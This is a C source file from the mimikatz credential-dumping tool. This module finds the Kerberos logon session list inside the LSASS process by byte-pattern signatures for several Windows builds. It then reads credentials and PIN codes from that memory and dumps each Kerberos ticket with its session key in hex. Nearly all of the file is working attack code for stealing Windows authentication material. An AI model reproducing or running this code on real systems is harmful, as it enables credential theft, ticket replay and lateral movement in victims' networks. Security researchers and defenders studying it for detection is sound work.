/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_sekurlsa_kerberos.h"
#ifdef _M_X64
BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
};
#elif defined _M_IX86
BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x53, 0x8b, 0x18, 0x50, 0x56};
BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x57, 0x8b, 0x38, 0x50, 0x68};
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,2}},
};
#endif

PVOID KerbLogonSessionListOrTable = NULL;
LONG KerbOffsetIndex = 0;

const KERB_INFOS kerbHelper[] = {
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, pinCode),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION_51),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, Ticket),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_51),
	},
	{
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, Ticket),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_52),
	},
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
		sizeof(KIWI_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, DomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Description),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, AltTargetDomainName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, KeyType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, RenewUntil),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TicketEncType),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, Ticket),
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_6),
	},
};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_single_package[] = {&kuhl_m_sekurlsa_kerberos_package};

NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[])
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_kerberos_single_package, 1, NULL, NULL);
}

LONG kuhl_m_sekurlsa_kerberos_enum(PKUHL_M_SEKURLSA_EXTERNAL callback, LPVOID state)
{
	return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_kerberos_single_package, 1, callback, state);
}

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKUHL_M_SEKURLSA_EXTERNAL externalCallback, IN OPTIONAL LPVOID externalCallbackData)
{
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	UNICODE_STRING pinCode;

	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, sizeof(KerberosReferences) / sizeof(KULL_M_PATCH_GENERIC), &KerbLogonSessionListOrTable, NULL, &KerbOffsetIndex))
	{
		aLsassMemory.address = KerbLogonSessionListOrTable;
		if(pData->cLsass->osContext.MajorVersion < 6)
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		else
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		
		if(aLsassMemory.address)
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structSize))
		        {
					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, 0, externalCallback, externalCallbackData);
					if(aLsassMemory.address = (*(PUNICODE_STRING *) ((PBYTE) aLocalMemory.address + kerbHelper[KerbOffsetIndex].offsetPin)))
					{
						aLocalMemory.address = &pinCode;
						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(UNICODE_STRING)))
							kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((pData->cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0), externalCallback, externalCallbackData);
					}
		        }
				LocalFree(aLocalMemory.address);
			}
		}
	} else kprintf(L"KO");
}

NTSTATUS kuhl_m_sekurlsa_kerberos_tickets(int argc, wchar_t * argv[])
{
	kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_tickets, NULL);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
	DWORD i;

	kprintf(L"\nAuthentication Id : %u ; %u (%08x:%08x)\n"
				L"Session           : %s from %u\n"
				L"User Name         : %wZ\n"
				L"Domain            : %wZ\n"
				, pData->LogonId->HighPart, pData->LogonId->LowPart, pData->LogonId->HighPart, pData->LogonId->LowPart, KUHL_M_SEKURLSA_LOGON_TYPE[pData->LogonType], pData->Session, pData->UserName, pData->LogonDomain);

	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, sizeof(KerberosReferences) / sizeof(KULL_M_PATCH_GENERIC), &KerbLogonSessionListOrTable, NULL, &KerbOffsetIndex))
	{
		aLsassMemory.address = KerbLogonSessionListOrTable;
		if(pData->cLsass->osContext.MajorVersion < 6)
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		else
			aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromAVLByLuid(&aLsassMemory, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId);
		
		if(aLsassMemory.address)
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
			{
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structSize))
				{
					for(i = 0; i < 3; i++)
					{
						kprintf(L"\n\tTickets group %u", i);
						kuhl_m_sekurlsa_kerberos_enum_tickets(pData, (PBYTE) aLsassMemory.address + kerbHelper[KerbOffsetIndex].offsetTickets[i]);
						kprintf(L"\n");
					}
				}
				LocalFree(aLocalMemory.address);
			}
		}
	} else kprintf(L"KO");

	return TRUE;
}

static const PCWCHAR TicketFlagsToStrings[] = {
	L"name_canonicalize",
	L"?",
	L"ok_as_delegate",
	L"?",
	L"hw_authent",
	L"pre_authent",
	L"initial",
	L"renewable",
	L"invalid",
	L"postdated",
	L"may_postdate",
	L"proxy",
	L"proxiable",
	L"forwarded",
	L"forwardable",
	L"reserved",
};

void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN PVOID tickets)
{
	PVOID pStruct, pRef = tickets;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS data = {&pStruct, &hBuffer}, aTicket = {NULL, &hBuffer}, aLocalBuffer = {NULL, &hBuffer}, aKeyBuffer = {NULL, &hBuffer}, aLsassBuffer = {tickets, pData->cLsass->hLsassMem};
	DWORD TicketFlags, nbTickets = 0, i;
	KIWI_KERBEROS_BUFFER key, ticket;
	PUNICODE_STRING pDesc;
	LPBYTE pTicket;

	if(aTicket.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structTicketSize))
	{
		if(kull_m_memory_copy(&data, &aLsassBuffer, sizeof(PVOID)))
		{
			data.address = pStruct;
			data.hMemory = pData->cLsass->hLsassMem;

			while(data.address != pRef)
			{
				if(kull_m_memory_copy(&aTicket, &data, kerbHelper[KerbOffsetIndex].structTicketSize))
				{
					pTicket = (LPBYTE) aTicket.address;
					kprintf(L"\n\t [%08x]", nbTickets++);
					
					kprintf(L"\n\t   Start/End/MaxRenew: ");
					kuhl_m_sekurlsa_kerberos_time((PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetStartTime));
					kuhl_m_sekurlsa_kerberos_time((PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetEndTime));
					kuhl_m_sekurlsa_kerberos_time((PFILETIME) (pTicket + kerbHelper[KerbOffsetIndex].offsetRenewUntil));

					TicketFlags = *(PULONG) ((pTicket + kerbHelper[KerbOffsetIndex].offsetTicketFlags)) >> 16;
					kprintf(L"\n\t   Flags %08x    : ", TicketFlags);
					for(i = 0; i < 16; i++)
						if((TicketFlags >> i) & 1)
							kprintf(L"%s ; ", TicketFlagsToStrings[i]);
					
					kprintf(L"\n\t   Service Name ");
					kuhl_m_sekurlsa_kerberos_names(pData->cLsass, *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetServiceName),	(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDomainName));
					kprintf(L"\n\t   Target Name  ");
					kuhl_m_sekurlsa_kerberos_names(pData->cLsass, *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetName),	(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetTargetDomainName));
					kprintf(L"\n\t   Client Name  ");
					kuhl_m_sekurlsa_kerberos_names(pData->cLsass, *(PKERB_EXTERNAL_NAME *) (pTicket + kerbHelper[KerbOffsetIndex].offsetClientName),	(PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetAltTargetDomainName));
					
					pDesc = (PUNICODE_STRING) (pTicket + kerbHelper[KerbOffsetIndex].offsetDescription);
					kull_m_string_getUnicodeString(pDesc, pData->cLsass->hLsassMem);
					kprintf(L" ( %wZ )", pDesc);
					LocalFree(pDesc->Buffer);
					
					kprintf(L"\n\t   Session Key  (%u) : ", *(ULONG *) (pTicket + kerbHelper[KerbOffsetIndex].offsetKeyType));
					key = *(KIWI_KERBEROS_BUFFER *) (pTicket + kerbHelper[KerbOffsetIndex].offsetKey);
					if(aKeyBuffer.address = LocalAlloc(LPTR, key.Length))
					{
						if(aLsassBuffer.address = key.Value)
							if(kull_m_memory_copy(&aKeyBuffer, &aLsassBuffer, key.Length))
								kull_m_string_wprintf_hex(aKeyBuffer.address, key.Length, 1);
						LocalFree(aKeyBuffer.address);
					}
					kprintf(L"\n\t   Ticket       (%u) : ", *(ULONG *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTicketEncType));
					ticket = *(KIWI_KERBEROS_BUFFER *) (pTicket + kerbHelper[KerbOffsetIndex].offsetTicket);
					if(aLocalBuffer.address = LocalAlloc(LPTR, ticket.Length))
					{
						if(aLsassBuffer.address = ticket.Value)
							if(kull_m_memory_copy(&aLocalBuffer, &aLsassBuffer, ticket.Length))
								kull_m_string_wprintf_hex(aLocalBuffer.address, ticket.Length, 1);
						LocalFree(aLocalBuffer.address);
					}
					data.address = ((PLIST_ENTRY) (aTicket.address))->Flink;
				}
				else break;
			}
		}
		LocalFree(aTicket.address);
	}
}

void kuhl_m_sekurlsa_kerberos_names(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PKERB_EXTERNAL_NAME pName, IN PUNICODE_STRING pDomain)
{
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aName = {pName, cLsass->hLsassMem}, aLocalBuffer = {NULL, &hBuffer}, aLocalStrings = {NULL, &hBuffer};
	PUNICODE_STRING names;
	USHORT count, i;
	SHORT type;
	SIZE_T buffSize;

	if(pName)
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) - sizeof(UNICODE_STRING)))
		{
			if(kull_m_memory_copy(&aLocalBuffer, &aName, sizeof(KERB_EXTERNAL_NAME) - sizeof(UNICODE_STRING)))
			{
				count = ((PKERB_EXTERNAL_NAME) aLocalBuffer.address)->NameCount;
				type  = ((PKERB_EXTERNAL_NAME) aLocalBuffer.address)->NameType;

				kprintf(L"(%02hu) : ", type);
				buffSize = count * sizeof(UNICODE_STRING);

				if(names = (PUNICODE_STRING) LocalAlloc(LPTR, buffSize))
				{
					aLocalStrings.address = names;
					aName.address = (PBYTE) aName.address + sizeof(KERB_EXTERNAL_NAME) - sizeof(UNICODE_STRING);
					if(kull_m_memory_copy(&aLocalStrings, &aName, buffSize))
					{
						for(i = 0; i < count; i++)
						{
							kull_m_string_getUnicodeString(&names[i], cLsass->hLsassMem);
							kprintf(L"%wZ ; ", &names[i]);
							LocalFree(names[i].Buffer);
						}
					}
					LocalFree(names);
				}
			}
			LocalFree(aLocalBuffer.address);
		}
	}
	else kprintf(L"( /) : ");

	kull_m_string_getUnicodeString(pDomain, cLsass->hLsassMem);
	kprintf(L"@ %wZ", pDomain);
	LocalFree(pDomain->Buffer);
}

void kuhl_m_sekurlsa_kerberos_time(IN PFILETIME pFileTime)
{
	SYSTEMTIME st;
	wchar_t buffer[255];
	if(FileTimeToLocalFileTime(pFileTime, pFileTime) && FileTimeToSystemTime(pFileTime, &st ))
	{
		if(GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer, sizeof(buffer) / sizeof(wchar_t)))
		{
			kprintf(L"%s ", buffer);
			if(GetTimeFormat(LOCALE_USER_DEFAULT, 0, &st, NULL, buffer, sizeof(buffer) / sizeof(wchar_t)))
				kprintf(L"%s ; ", buffer);
		}
	}
}
